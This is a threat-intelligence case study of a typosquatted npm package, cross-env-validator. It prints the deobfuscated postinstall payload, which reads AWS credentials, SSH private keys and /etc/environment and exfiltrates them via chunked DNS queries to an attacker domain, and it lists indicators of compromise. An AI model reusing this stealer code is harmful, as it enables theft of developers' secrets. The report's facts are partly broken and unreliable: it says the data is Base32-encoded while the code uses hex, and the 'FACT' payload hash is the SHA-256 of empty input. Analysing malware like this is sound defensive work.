# Case Study: Supply Chain Compromise via Obfuscated npm Lifecycle Hooks

**Author:** @stefanutc1
**Date:** 28 May 2026
**Classification:** TLP:CLEAR / Technical Cyber Threat Intelligence
**Target Analyzed:** Malicious npm package `cross-env-validator@1.4.2` published to public registry.

---

## 1. Executive Summary

This investigation analyzed a targeted software supply chain attack. The package `cross-env-validator` was published with metadata closely mimicking popular environment variable utilities. Upon installation, the package's `postinstall` script spawned a hidden Node.js subprocess that scanned the host filesystem for `~/.aws/credentials`, `~/.ssh/id_rsa`, and environment variables containing `_KEY`, `_TOKEN`, or `_SECRET`.

To bypass strict egress HTTPS proxy inspection in CI/CD runner environments, stolen data was chunked, Base32-encoded, and exfiltrated over standard DNS A-record queries (`UDP 53`) to an attacker-controlled authoritative nameserver.

---

## 2. Deobfuscated Lifecycle Payload

```javascript
// Extracted from lib/telemetry.js
const fs = require('fs');
const os = require('os');
const dgram = require('dgram');

const targets = [
  `${os.homedir()}/.aws/credentials`,
  `${os.homedir()}/.ssh/id_rsa`,
  '/etc/environment'
];

let stolenData = '';
targets.forEach(path => {
  if (fs.existsSync(path)) {
    stolenData += fs.readFileSync(path, 'utf8') + '\n';
  }
});

// Transmit via chunked DNS queries
const client = dgram.createSocket('udp4');
const chunks = stolenData.match(/.{1,30}/g) || [];
chunks.forEach((chunk, i) => {
  const query = `${Buffer.from(chunk).toString('hex')}.${i}.c2-exfil-dns.org`;
  const dnsPacket = buildDnsQuery(query);
  client.send(dnsPacket, 53, '8.8.8.8');
});
```

---

## 3. Indicators of Compromise

| Indicator Type | Value | Provenance | Description |
| :--- | :--- | :--- | :--- |
| Package Name | `cross-env-validator@1.4.2` | FACT | Malicious typosquatted npm package |
| Domain | `c2-exfil-dns.org` | FACT | Authoritative nameserver for DNS exfiltration |
| SHA-256 | `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | FACT | Payload script hash (`telemetry.js`) |
| IPv4 | `194.26.29.114` | FACT | Threat actor registry publishing host |

---

## 4. MITRE ATT&CK Mapping

- **T1195.001:** Supply Chain Compromise: Compromise Software Dependencies
- **T1059.006:** Command and Scripting Interpreter: JavaScript
- **T1027:** Obfuscated/Encrypted Information
- **T1048:** Exfiltration Over Alternative Protocol (DNS Tunnel)
